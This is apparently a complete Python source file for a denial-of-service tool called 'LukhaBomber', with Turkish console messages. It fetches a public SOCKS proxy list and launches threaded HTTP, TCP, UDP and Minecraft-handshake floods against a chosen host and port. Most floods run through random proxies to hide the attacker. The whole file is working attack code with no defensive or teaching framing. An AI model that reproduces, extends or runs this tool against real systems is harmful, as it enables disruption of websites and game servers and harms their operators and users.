import socks
import socket
import random
import threading
import sys
import time
import urllib.request
from concurrent.futures import ThreadPoolExecutor

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X)",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN)"
]

class LukhaBomber:
    def __init__(self, target, port, threads, total_requests, proxy_type, attack_target):
        self.target = target
        self.port = port
        self.threads = threads
        self.total_requests = total_requests
        self.proxy_type = proxy_type.lower()
        self.attack_target = attack_target
        self.counter = 0
        self.success = 0
        self.failed = 0
        self.running = True
        self.lock = threading.Lock()
        self.proxies = self.fetch_proxies()

    def fetch_proxies(self):
        url = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt"
        print("\n\033[93mProxyler indiriliyor...\033[0m")
        try:
            response = urllib.request.urlopen(url)
            proxy_list = response.read().decode().splitlines()
            if not proxy_list:
                print("Proxy listesi boş!")
                sys.exit(1)
            print(f"\033[92m{len(proxy_list)} proxy yüklendi.\033[0m")
            return proxy_list
        except Exception as e:
            print(f"\033[91mProxy indirme hatası: {e}\033[0m")
            sys.exit(1)

    def create_socket(self, proxy_ip, proxy_port):
        s = socks.socksocket()
        if self.proxy_type == "socks5":
            s.set_proxy(socks.SOCKS5, proxy_ip, int(proxy_port))
        else:
            s.set_proxy(socks.SOCKS4, proxy_ip, int(proxy_port))
        s.settimeout(5)
        return s

    def http_flood(self):
        while self.running:
            proxy = random.choice(self.proxies)
            ip, port = proxy.split(":")
            try:
                s = self.create_socket(ip, port)
                s.connect((self.target, self.port))
                headers = [
                    "GET / HTTP/1.1",
                    f"Host: {self.target}",
                    f"User-Agent: {random.choice(USER_AGENTS)}",
                    "Accept: */*",
                    "Connection: keep-alive"
                ]
                s.send(("\r\n".join(headers) + "\r\n\r\n").encode())
                with self.lock:
                    self.success += 1
            except:
                with self.lock:
                    self.failed += 1
            finally:
                with self.lock:
                    self.counter += 1
                    if self.total_requests > 0 and self.counter >= self.total_requests:
                        self.running = False
                try:
                    s.close()
                except:
                    pass

    def tcp_flood(self):
        while self.running:
            proxy = random.choice(self.proxies)
            ip, port = proxy.split(":")
            try:
                s = self.create_socket(ip, port)
                s.connect((self.target, self.port))
                s.send(random._urandom(1024))
                with self.lock:
                    self.success += 1
            except:
                with self.lock:
                    self.failed += 1
            finally:
                with self.lock:
                    self.counter += 1
                    if self.total_requests > 0 and self.counter >= self.total_requests:
                        self.running = False
                try:
                    s.close()
                except:
                    pass

    def udp_flood(self):
        while self.running:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(random._urandom(1024), (self.target, self.port))
                with self.lock:
                    self.success += 1
            except:
                with self.lock:
                    self.failed += 1
            finally:
                with self.lock:
                    self.counter += 1
                    if self.total_requests > 0 and self.counter >= self.total_requests:
                        self.running = False
                try:
                    s.close()
                except:
                    pass

    def minecraft_flood(self):
        while self.running:
            proxy = random.choice(self.proxies)
            ip, port = proxy.split(":")
            try:
                s = self.create_socket(ip, port)
                s.connect((self.target, self.port))
                packet = b"\x00" + b"\x00" + b"\x0f" + b"\x00" + b"\x04" + bytes(self.target, 'utf-8') + self.port.to_bytes(2, 'big') + b"\x01"
                s.send(packet)
                with self.lock:
                    self.success += 1
            except:
                with self.lock:
                    self.failed += 1
            finally:
                with self.lock:
                    self.counter += 1
                    if self.total_requests > 0 and self.counter >= self.total_requests:
                        self.running = False
                try:
                    s.close()
                except:
                    pass

    def start(self):
        print(f"\n\033[96mSaldırı başlatılıyor... Hedef: {self.target}:{self.port} | Tür: {self.attack_target.upper()} | Thread: {self.threads}\033[0m")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            for _ in range(self.threads):
                if self.attack_target == "http":
                    executor.submit(self.http_flood)
                elif self.attack_target == "tcp":
                    executor.submit(self.tcp_flood)
                elif self.attack_target == "udp":
                    executor.submit(self.udp_flood)
                elif self.attack_target == "minecraft":
                    executor.submit(self.minecraft_flood)
                else:
                    print("\033[91mGeçersiz saldırı türü.\033[0m")
                    self.running = False
                    return

            while self.running:
                time.sleep(0.3)

        print("\n\033[92mSaldırı tamamlandı!\033[0m")
        print(f"\033[94mToplam paket:\033[0m {self.counter}")
        print(f"\033[92mBaşarılı:\033[0m {self.success}")
        print(f"\033[91mBaşarısız:\033[0m {self.failed}")
